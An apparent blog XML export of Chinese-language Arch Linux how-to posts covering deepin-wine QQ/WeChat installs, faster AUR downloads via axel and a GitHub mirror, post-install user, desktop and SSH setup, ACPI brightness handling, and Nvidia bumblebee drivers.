    <content><![CDATA[<h1 id="最新版"><a href="#最新版" class="headerlink" title="最新版"></a>最新版</h1><p>最新版会存在部分不兼容的问题，如微信发不了大图等，可以试着安装兼容稳定版</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>AUR</strong> :</p>
<p>QQ : <code>deepin-wine-qq</code><br>TIM : <code>deepin-wine-tim</code><br>微信 : <code>deepin-wine-wechat</code><br>迅雷 : <code>deepin-wine-thunderspeed</code></p>
<p><strong>项目地址：</strong> <a href="https://github.com/countstarlight/deepin-wine-qq-arch">QQ</a> , <a href="https://github.com/countstarlight/deepin-wine-tim-arch">TIM</a> , <a href="https://github.com/countstarlight/deepin-wine-wechat-arch">微信</a> , <a href="https://github.com/countstarlight/deepin-wine-thunderspeed-arch">迅雷</a></p>
<h2 id="换用DeepinWine"><a href="#换用DeepinWine" class="headerlink" title="换用DeepinWine"></a>换用DeepinWine</h2><p>QQ : <code>/opt/deepinwine/apps/Deepin-QQ/run.sh -d</code></p>
<p>TIM : <code>/opt/deepinwine/apps/Deepin-TIM/run.sh -d</code></p>
<p>微信 : <code>/opt/deepinwine/apps/Deepin-WeChat/run.sh -d</code></p>
<a id="more"></a>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>QQ : <code>/opt/deepinwine/apps/Deepin-QQ/run.sh</code></p>
<p>TIM : <code>/opt/deepinwine/apps/Deepin-TIM/run.sh</code></p>
<p>微信 : <code>/opt/deepinwine/apps/Deepin-WeChat/run.sh</code></p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>QQ : <code>/opt/deepinwine/apps/Deepin-QQ/run.sh</code></p>
<p>TIM : <code>/opt/deepinwine/apps/Deepin-TIM/run.sh</code></p>
<p>微信 : <code>/opt/deepinwine/apps/Deepin-WeChat/run.sh</code></p>
<p>迅雷 : <code>/opt/deepinwine/apps/Deepin-ThunderSpeed/run.sh</code></p>
<h2 id="创建软链接"><a href="#创建软链接" class="headerlink" title="创建软链接"></a>创建软链接</h2><p>QQ : <code>sudo ln -s /opt/deepinwine/apps/Deepin-QQ/run.sh /usr/bin/qq</code></p>
<p>TIM : <code>sudo ln -s /opt/deepinwine/apps/Deepin-TIM/run.sh /usr/bin/tim</code></p>
<p>微信 : <code>sudo ln -s /opt/deepinwine/apps/Deepin-WeChat/run.sh /usr/bin/wechat</code></p>
<p>迅雷 : <code>sudo ln -s /opt/deepinwine/apps/Deepin-ThunderSpeed/run.sh /usr/bin/xunlei</code></p>
<h1 id="兼容稳定版"><a href="#兼容稳定版" class="headerlink" title="兼容稳定版"></a>兼容稳定版</h1><p>QQ : <code>deepin.com.qq.im</code><br>TIM : <code>deepin.com.qq.office</code><br>微信 : <code>deepin.com.wechat2</code><br>迅雷 : <code>deepin.com.thunderspeed</code></p>
<p>对于非 GNOME 桌面 , 安装 <code>xsettingsd</code> ,并配置</p>
<p><code>sudo pacman -S xsettingsd</code></p>
<p><code>/opt/deepinwine/apps/****/run.sh</code></p>
<p>加入以下内容</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+    if [[ -z &quot;$(ps -e | grep -o xsettingsd)&quot; ]]</span></span><br><span class="line"><span class="addition">+    then</span></span><br><span class="line"><span class="addition">+        /usr/bin/xsettingsd &amp;</span></span><br><span class="line"><span class="addition">+    fi</span></span><br></pre></td></tr></table></figure>
<h2 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h2><p><code>/opt/deepinwine/apps/****/run.sh</code></p>
<h2 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h2><p><code>/opt/deepinwine/apps/****/run.sh</code></p>
<h2 id="创建软链接-1"><a href="#创建软链接-1" class="headerlink" title="创建软链接"></a>创建软链接</h2><p>QQ : <code>sudo ln -s /opt/deepinwine/apps/Deepin-QQ/run.sh /usr/bin/qq</code></p>
<p>TIM : <code>sudo ln -s /opt/deepinwine/apps/Deepin-TIM/run.sh /usr/bin/tim</code></p>
<p>微信 : <code>sudo ln -s /opt/deepinwine/apps/Deepin-WeChat/run.sh /usr/bin/wechat</code></p>
<p>迅雷 : <code>sudo ln -s /opt/deepinwine/apps/Deepin-ThunderSpeed/run.sh /usr/bin/xunlei</code></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch安装AUR软件时github下载软件包慢或不可获得的问题</title>
    <url>/posts/518cc2d8/</url>
    <content><![CDATA[<p>github的release，噩梦一般。当AUR里面调用缺省的curl去对付那些包的时候，90%的情况是无法成功的。即便成功也是苦等几十分钟。至少我的网络环境是这样。</p>
<p><code>/etc/makepkg.conf</code> ： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-- The download utilities that makepkg should use to acquire sources</span><br><span class="line">#  Format: &#39;protocol::agent&#39;</span><br><span class="line">DLAGENTS&#x3D;(&#39;file::&#x2F;usr&#x2F;bin&#x2F;curl -gqC - -o %o %u&#39;</span><br><span class="line">          &#39;ftp::&#x2F;usr&#x2F;bin&#x2F;curl -gqfC - --ftp-pasv --retry 3 --retry-delay 3 -o %o %u&#39;</span><br><span class="line">          &#39;http::&#x2F;usr&#x2F;bin&#x2F;curl -gqb &quot;&quot; -fLC - --retry 3 --retry-delay 3 -o %o %u&#39;</span><br><span class="line">          &#39;https::&#x2F;usr&#x2F;bin&#x2F;curl -gqb &quot;&quot; -fLC - --retry 3 --retry-delay 3 -o %o %u&#39;</span><br><span class="line">          &#39;rsync::&#x2F;usr&#x2F;bin&#x2F;rsync --no-motd -z %u %o&#39;</span><br><span class="line">          &#39;scp::&#x2F;usr&#x2F;bin&#x2F;scp -C %u %o&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>吧curl换成了axel</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DLAGENTS&#x3D;(&#39;file::&#x2F;usr&#x2F;bin&#x2F;curl -gqC - -o %o %u&#39;</span><br><span class="line">          &#39;ftp::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;http::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;https::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;rsync::&#x2F;usr&#x2F;bin&#x2F;rsync --no-motd -z %u %o&#39;</span><br><span class="line">          &#39;scp::&#x2F;usr&#x2F;bin&#x2F;scp -C %u %o&#39;)</span><br></pre></td></tr></table></figure>
<p>但github不管多少线程都跑不动，改用镜像站下载</p>
<p>github镜像站：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com.cnpmjs.org</span><br><span class="line">https:&#x2F;&#x2F;hub.fastgit.org</span><br></pre></td></tr></table></figure></p>
<p>先<code>ping</code> 一下比较相应时间，选择优质的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ping github.com</span><br><span class="line">ping github.com.cnpmjs.org</span><br><span class="line">ping fastgit.org</span><br></pre></td></tr></table></figure>
<p>参考: <a href="https://www.cnblogs.com/seniortestingdev/p/13393785.html">让你的GitHub下载飞速提升到2M/s以上</a></p>
<p>通过脚本换链接：</p>
<p><code>axel_for_makepkg.sh</code> :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 该脚本用于处理yay安装软件时，由github下载缓慢甚至无法下载的问题</span></span><br><span class="line"><span class="comment"># 检测域名是不是github，如果是，则替换为镜像网站</span></span><br><span class="line"><span class="comment"># 采用axel代替curl进行10线程下载</span></span><br><span class="line"><span class="comment"># 实验用链接：</span></span><br><span class="line"><span class="comment"># https://download.fastgit.org/beekeeper-studio/beekeeper-studio/releases/download/v1.6.11/beekeeper-studio_1.6.11_amd64.deb</span></span><br><span class="line"><span class="comment"># https://github.com/beekeeper-studio/beekeeper-studio/releases/download/v1.6.11/beekeeper-studio_1.6.11_amd64.deb</span></span><br><span class="line"></span><br><span class="line">domin=`<span class="built_in">echo</span> <span class="variable">$2</span> | cut -f3 -d<span class="string">&#x27;/&#x27;</span>`;</span><br><span class="line">others=`<span class="built_in">echo</span> <span class="variable">$2</span> | cut -f4- -d<span class="string">&#x27;/&#x27;</span>`;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$domin</span>&quot;</span> <span class="keyword">in</span> </span><br><span class="line">    <span class="string">&quot;github.com&quot;</span>)</span><br><span class="line">    url=<span class="string">&quot;https://download.fastgit.org/&quot;</span><span class="variable">$others</span>;</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">    url=<span class="variable">$2</span>;</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;download from <span class="variable">$url</span>&quot;</span>;</span><br><span class="line">/usr/bin/axel -n 10 -a -o <span class="variable">$1</span> <span class="variable">$url</span>;</span><br></pre></td></tr></table></figure>
<p>修改<code>/etc/makepkg.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DLAGENTS&#x3D;(&#39;file::&#x2F;usr&#x2F;bin&#x2F;curl -gqC - -o %o %u&#39;</span><br><span class="line">          &#39;ftp::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;http::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;https::~&#x2F;meshell&#x2F;fake_download_tools&#x2F;fake_axel_for_makepkg %o %u&#39;</span><br><span class="line">          &#39;rsync::&#x2F;usr&#x2F;bin&#x2F;rsync --no-motd -z %u %o&#39;</span><br><span class="line">          &#39;scp::&#x2F;usr&#x2F;bin&#x2F;scp -C %u %o&#39;)</span><br></pre></td></tr></table></figure>
<p>镜像不允许多线程下载哈哈，然而没关系，axel自动fallback成单线程</p>
<p>参考: <a href="https://zhuanlan.zhihu.com/p/176987140">机智的解决arch/manjaro安装AUR软件时github下载软件包慢或不可获得的问题</a></p>
]]></content>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch安装之后</title>
    <url>/posts/e2611cb/</url>
    <content><![CDATA[<h1 id="创建普通用户"><a href="#创建普通用户" class="headerlink" title="创建普通用户"></a>创建普通用户</h1><p>创建一个普通用户并创建其家目录和加入<code>whell</code>用户组:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m -G wheel 用户名</span><br></pre></td></tr></table></figure>
<p><code>wheel</code> 组的概念继承自 <code>UNIX</code>，当需要进行一些系统的高级维护时，往往要用到 <code>root</code> 权限；而“wheel” 组就是一个包含这些特殊权限的用户池；如果不是“wheel”组的成员，就无法取得 <code>root</code> 权限进行一些特权的操作。</p>
<p><strong>将一个已有用户加入<code>wheel</code>用户组: <code>usermod -G wheel 用户名</code></strong></p>
<a id="more"></a>
<h2 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h2><ul>
<li><code>staff</code> 和 <code>wheel</code> 的区别: <code>wheel</code> 组是一个拥有 <code>root</code> 特权的用户组；而 <code>staff</code> 组是所有普通用户的集合。</li>
</ul>
<ul>
<li><p>对于服务器来说，希望剥夺 wheel 组用户以外的普通用户通过 su 命令来登录 root 的机会（即只有属于 wheel 组的用户才可以用 su 登录为 root）。这样就进一步增强了系统的安全性。步骤如下：</p>
<ul>
<li><p>修改 <code>/etc/pam.d/su</code> 文件，找到 <code>#auth required /lib/security/$ISA/pam_wheel.so use_uid</code> ，将行首的注释 <code>#</code> 去掉。</p>
</li>
<li><p>修改 <code>/etc/login.defs</code> 文件，在最后一行增加 <code>SU_WHEEL_ONLY yes</code> 语句。</p>
</li>
<li><p>将一个用户添加到 wheel 组中。</p>
</li>
<li>用被添加到 <code>wheel</code> 组的用户登录，执行 <code>su</code> 命令输入密码即可登录 <code>root</code> 用户。</li>
</ul>
</li>
</ul>
<h2 id="开放用户组组所有权限-可选"><a href="#开放用户组组所有权限-可选" class="headerlink" title="开放用户组组所有权限(可选)"></a>开放用户组组所有权限(可选)</h2><p>修改 <code>/etc/sudoers</code> 文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 取消注释以允许 wheel 组成员执行任何命令</span></span><br><span class="line"><span class="comment"># %wheel ALL=(ALL) ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 不输入密码执行命令</span></span><br><span class="line"><span class="comment"># %wheel ALL=(ALL) NOPASSWD: ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 取消注释以允许sudo 组的成员执行任何命令</span></span><br><span class="line"><span class="comment"># %sudo ALL=(ALL) ALL</span></span><br></pre></td></tr></table></figure></p>
<h1 id="安装基础软件"><a href="#安装基础软件" class="headerlink" title="安装基础软件"></a>安装基础软件</h1><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p><code>sudo pacman -S vim</code></p>
<p>或 neovim : <code>sudo pacman -S neovim</code></p>
<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p><code>sudo pacman -S git</code></p>
<h2 id="yay"><a href="#yay" class="headerlink" title="yay"></a>yay</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装AUR基础包</span></span><br><span class="line">sudo pacman -S --needed base-devel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装yay</span></span><br><span class="line">git <span class="built_in">clone</span> https://aur.archlinux.org/yay.git</span><br><span class="line"><span class="built_in">cd</span> yay</span><br><span class="line">makepkg -si</span><br><span class="line"></span><br><span class="line"><span class="comment"># yay换AUR源 可修改文件`~/.config/yay/config.json`</span></span><br><span class="line">yay --aururl <span class="string">&quot;https://aur.tuna.tsinghua.edu.cn&quot;</span> --save</span><br><span class="line"><span class="comment"># 查看配置</span></span><br><span class="line">yay -P -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加archlinuxcn源，在文件`/etc/pacman.conf`中添加：</span></span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line"><span class="comment"># 安装GPG key</span></span><br><span class="line">sudo pacman -Syy</span><br><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure>
<h1 id="修改grub等待时间"><a href="#修改grub等待时间" class="headerlink" title="修改grub等待时间"></a>修改grub等待时间</h1><p>修改<code>/etc/default/grub</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将时间修改为需要的秒数</span></span><br><span class="line">GRUB_TIMEOUT=0</span><br></pre></td></tr></table></figure>
<p>每当修改 <code>/etc/default/grub</code> 或 <code>/etc/grub.d/</code> 中的文件之后，都需要再次生成主配置文件<code>/boot/grub/grub.cfg</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<h1 id="安装图形化桌面"><a href="#安装图形化桌面" class="headerlink" title="安装图形化桌面"></a>安装图形化桌面</h1><p>linux 的图形化桌面有很多（主流：KDE,GNOME,Xfce,LXDE,Deepin,Mate等）,这里选择<code>i3</code>，i3是一个动态平铺窗口管理器，主要针对开发人员和高级用户。</p>
<p>图形桌面的安装大多是相同的，举一反三即可安装其他桌面</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xorg-server lightdm lightdm-gtk-greeter i3-gaps i3blocks rofi alacritty wqy-microhei</span><br></pre></td></tr></table></figure>
<ul>
<li><code>xorg-server</code> : 提供X窗口系统</li>
<li><code>lightdm</code> , <code>lightdm-gtk-greeter</code> : 显示管理器</li>
<li><code>i3-gaps</code> : 窗口管理器</li>
<li><code>i3blocks</code> : i3状态栏</li>
<li><code>rofi</code> : 软件起动器</li>
<li><code>alacritty</code> : 终端</li>
<li><code>wqy-microhei</code> : 中文字体 </li>
</ul>
<p>可用登录管理器(如 : <code>ly</code> (AUR))代替显示管理器,但可能没法兼容闭源Nvidia驱动; 配置开机启动<code>sudo systemctl enable ly</code></p>
<p>若使用<code>xorg-xinit</code>启动：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/X11/xinit/xinitrc ~/.xinitrc</span><br><span class="line">vim ~/.xinitrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换以下内容</span></span><br><span class="line">twm &amp;</span><br><span class="line">xclock -geometry 50x50-1+1 &amp;</span><br><span class="line">xterm -geometry 80x50+494+51 &amp;</span><br><span class="line">xterm -geometry 80x20+494-0 &amp;</span><br><span class="line"><span class="built_in">exec</span> xterm -geometry 80x66+0+0 -name login</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为</span></span><br><span class="line"><span class="built_in">exec</span> i3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后就可执行startx打开i3</span></span><br><span class="line"><span class="comment"># 也可在shell的配置 ~/.bashrc 最后加入 startx 配置用户登录后自动启动</span></span><br></pre></td></tr></table></figure></p>
<p>i3配置<br>初次进入i3会提示是否生成用户配置文件<code>~/.config/i3/config</code>和设置<code>Mod</code>键<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/i3/config</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mod键： Mod1为Alt键,Mod4为Windows/Command键</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$mod</span> Mod4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 状态栏</span></span><br><span class="line"><span class="comment"># bar &#123;</span></span><br><span class="line"><span class="comment"># 	status_command i3status</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line">bar &#123;</span><br><span class="line">	status_command i3blocks</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 软件启动器</span></span><br><span class="line"><span class="comment"># bindsym Mod1+d exec dmenu_run</span></span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line">bindsym Mod1+d <span class="built_in">exec</span> rofi -show run</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h3 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h3><ul>
<li><p>直接启用X服务 : <code>xorg-xinit</code> xinit程序允许用户通过<code>startx</code>脚本手动启动X显示服务。</p>
</li>
<li><p>图形显示服务 : <code>xorg-server</code>  启动X显示服务的两种方法是使用显示管理器和直接启动X服务。</p>
</li>
<li><p>显示管理器(登录管理器) :</p>
<ul>
<li>图形界面<ul>
<li><code>GDM</code> : GNOME的显示管理器</li>
<li><code>LightDM</code> : 跨桌面的显示管理器。</li>
<li><code>LXDM</code> : LXDE显示管理器，可以独立于LXDE桌面环境使用。</li>
<li><code>MDM</code> : Linux Mintd中的显示管理器</li>
<li><code>SDDM</code> : 基于QML的显示管理器，替代KDE4的KDM，推荐搭配 Plamsa5 或 LXQt 使用</li>
<li><code>XDM</code> : X显示管理器支持XDMCP（适合服务器的宿主机）</li>
</ul>
</li>
<li>控制台<ul>
<li><a href="https://github.com/ghost1227/cdm">CDM</a> AUR : 控制台显示管理器。</li>
<li><a href="https://github.com/dopsi/console-tdm">Console TDM</a> AUR : 扩展自xinit，由纯粹的Bash脚本编写的。</li>
<li><a href="https://github.com/spanezz/nodm">nodm</a> : 支持自动登录的简单显示管理器。</li>
<li><a href="https://github.com/cylgom/ly">Ly</a> AUR : 实验阶段的 ncurses 显示管理器。</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><a href="https://wiki.archlinux.org/index.php/Window_manager">窗口管理器</a> :<ul>
<li>平铺窗口管理器<ul>
<li><code>i3</code> : <code>i3-wm</code>或<code>i3-gaps</code>平铺窗口管理器（<code>i3-gaps</code>是<code>i3-wm</code>的分支，提供更多的功能）。</li>
</ul>
</li>
<li>堆叠窗口管理器<ul>
<li><code>Metacity</code> : GNOME2曾经默认使用的窗口管理器，后被Mutter取代。</li>
<li><code>Mutter</code> : GNOME3默认的窗口管理器。</li>
<li><code>Kwin</code> : KDE默认的窗口管理器。</li>
<li><code>Xfwm</code> : Xfce默认的窗口管理器。</li>
<li><code>Marco</code> : Mate默认的窗口管理器。</li>
</ul>
</li>
<li>动态窗口管理器<ul>
<li><code>dwm</code> : 用于X 的动态窗口管理器。管理平铺、单片和浮动布局中的窗口。 所有布局都可以动态应用，从而优化了使用中的应用程序和执行的任务的环境。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>lightdm 主题</strong><br>首先需要更改 <code>/etc/lightdm/lightdm.conf</code> 主配置文件设置<code>greeter</code><br>主题目录: <code>/usr/share/themes/</code><br>图标目录:<code>/usr/share/icons/</code></p>
<ul>
<li><p><code>lightdm-gtk-greeter</code>  <a href="https://www.gnome-look.org/">从gnome-look获取GTK主题</a> 安装<code>lightdm-gtk-greeter-settings</code> 通过图形界面配置</p>
</li>
<li><p><code>lightdm-webkit-greeter</code> 从github上获取主题</p>
</li>
<li><p><code>lightdm-webkit2-greeter</code> 从github上获取主题</p>
</li>
<li><p><code>slick-greeter</code> <a href="https://www.gnome-look.org/">从gnome-look获取GTK主题</a> 安装<code>lightdm-settings</code>图形管理</p>
</li>
</ul>
<p><a href="https://blog.csdn.net/chouzhou9701/article/details/90176122">参考</a></p>
<p><strong>GTK 窗体 &amp; 图标 &amp; 鼠标主题配置</strong><br><a href="https://www.gnome-look.org/">从gnome-look获取GTK主题</a><br>主题目录: <code>/usr/share/themes/</code><br>图标 &amp; 鼠标主题目录:<code>/usr/share/icons/</code><br>安装<code>lxappearance</code> (gtk2) 或<code>lxappearance-gtk3</code> (gtk3) 通过图形界面配置</p>
<h3 id="必备"><a href="#必备" class="headerlink" title="必备"></a>必备</h3><ul>
<li><code>i3blocks</code> 状态栏</li>
<li><code>rofi</code> 软件启动器</li>
<li><code>alacritty</code> 终端</li>
<li><code>wqy-microhei</code> 中文字体</li>
</ul>
<p>字体<br>ttf-symbola (提供许多 Unicode 符号，包括 Emoji)<br>wqy-zenhei  (文泉驿正黑体)<br>wqy-bitmapfont (文泉驿点阵宋体)<br>adobe-source-han-sans-otc-fonts (思源黑体，无衬线字体)<br>adobe-source-han-serif-otc-fonts (思源宋体，衬线字体)</p>
<h3 id="状态栏配置"><a href="#状态栏配置" class="headerlink" title="状态栏配置"></a>状态栏配置</h3><p>安装字体： <a href="https://github.com/FortAwesome/Font-Awesome"><code>fon-awesome</code></a>, <a href="https://gitlab.gnome.org/GNOME/pango">Pango</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S otf-font-awesome pango</span><br></pre></td></tr></table></figure></p>
<p>                                             <br>                                    </p>
<p>修改i3blocks配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[script] 		# 脚本</span><br><span class="line">#align&#x3D; 		# 对齐</span><br><span class="line">#color&#x3D; 		# 颜色</span><br><span class="line">command&#x3D; 		# 命令</span><br><span class="line">#format&#x3D; 		# 格式</span><br><span class="line">#full_text&#x3D; 	# 完整文字</span><br><span class="line">#instance&#x3D; 		# 实例</span><br><span class="line">interval&#x3D; 		# 间隔</span><br><span class="line">#label&#x3D; 		# 标签</span><br><span class="line">#markup&#x3D; 		# 标记</span><br><span class="line">#min_width&#x3D; 	# 最小宽度</span><br><span class="line">#name&#x3D; 			# 名称</span><br><span class="line">#separator&#x3D; 	# 分隔符</span><br><span class="line">#separator_block_width&#x3D; 	# 分隔块的宽度</span><br><span class="line">#short_text&#x3D; 	# 短文字</span><br><span class="line">#signal&#x3D; 		# 信号</span><br><span class="line">#urgent&#x3D; 		# 紧急</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backlight   亮度</span><br><span class="line">bandwidth2  带宽</span><br><span class="line">battery2  电量</span><br><span class="line">cpu_usage2</span><br><span class="line">disk-io</span><br><span class="line">gpu-load</span><br><span class="line">mediaplayer</span><br><span class="line">memory</span><br><span class="line">monitor_manager</span><br><span class="line">volume-pulseaudio</span><br><span class="line">usb</span><br><span class="line">ssid</span><br><span class="line">wifi</span><br></pre></td></tr></table></figure>
<p>yay -S ttf-symbola 提供许多 Unicode 符号，包括 Emoji</p>
<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S openssh</span><br></pre></td></tr></table></figure>
<p>ssh服务端配置文件 : <code>/etc/ssh/sshd_config</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只允许某些用户访问</span></span><br><span class="line">AllowUsers    用户1 用户2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只允许某些用户组访问</span></span><br><span class="line">AllowGroups   用户组1 用户组2</span><br><span class="line"></span><br><span class="line"><span class="comment">#禁用root登录</span></span><br><span class="line">PermitRootLongin no</span><br></pre></td></tr></table></figure>
<p>开机启动 : <code>sudo systemctl enable sshd</code><br>重启服务 : <code>sudo systemctl restart sshd</code></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch插拔外接电源时自动设置屏幕亮度</title>
    <url>/posts/695f0723/</url>
    <content><![CDATA[<p>在 <code>/etc/acpi/handler.sh</code> 脚本中添加条件亮度的代码实现</p>
<p>通过 <code>ls /sys/class/backlight/</code> 查看显卡设备,通过修改 <code>/sys/class/backlight/设备/brightness</code> 文件的值能直接控制屏幕亮度</p>
<a id="more"></a>
<p>如:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ls /sys/class/backlight/</span><br><span class="line"></span><br><span class="line">intel_backlight</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><figcaption><span>/etc/acpi/handler.sh</span></figcaption><table><tr><td class="code"><pre><span class="line">ac_adapter)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        AC*|AD*)</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$4</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">                00000000)</span><br><span class="line">                    <span class="built_in">echo</span> -n 30 &gt; /sys/class/backlight/intel_backlight/brightness</span><br><span class="line">                    ;;</span><br><span class="line">                00000001)</span><br><span class="line">                    <span class="built_in">echo</span> -n 100 &gt; /sys/class/backlight/intel_backlight/brightness</span><br><span class="line">                    ;;</span><br><span class="line">            <span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p><a href="https://wiki.archlinux.org/title/Acpid_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">更多处理电源事件</a>)</p>
]]></content>
      <categories>
        <category>Arch</category>
      </categories>
      <tags>
        <tag>Arch</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch独立显卡驱动安装</title>
    <url>/posts/4578a678/</url>
    <content><![CDATA[<p>  Linux到独立显卡分开源驱动和闭源驱动两种，开源驱动不能完全发挥独立显卡到性能，闭源驱动使用<code>bumblebee</code> 的 <code>optirun</code> 的兼容性不好。而 <code>optimus-manager</code> 可以设置开机默认使用 Intel 还是 Nvidia ，可以随时在这两者之间切换。</p>
<a id="more"></a>
<h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</span><br></pre></td></tr></table></figure>
<h1 id="安装闭源bumblebee版驱动"><a href="#安装闭源bumblebee版驱动" class="headerlink" title="安装闭源bumblebee版驱动"></a>安装闭源bumblebee版驱动</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee</span><br><span class="line"><span class="comment"># sudo mhwd -f -i pci video-hybrid-intel-nvidia-390xx-bumblebee</span></span><br></pre></td></tr></table></figure>
<h2 id="讲用户加入到bumblee组"><a href="#讲用户加入到bumblee组" class="headerlink" title="讲用户加入到bumblee组"></a>讲用户加入到bumblee组</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gpasswd -a <span class="variable">$USER</span> bumblebee</span><br></pre></td></tr></table></figure>
<h2 id="设置bumblebeed开机自启"><a href="#设置bumblebeed开机自启" class="headerlink" title="设置bumblebeed开机自启"></a>设置bumblebeed开机自启</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> bumblebeed</span><br></pre></td></tr></table></figure>
<p><strong>很多硬件厂商的BIOS驱动对Linux不友好，无法顺利加载ACPI模块，从而导致无法驱动独立显卡，这就需要修改grub启动文件使ACPI模块能正常工作</strong></p>
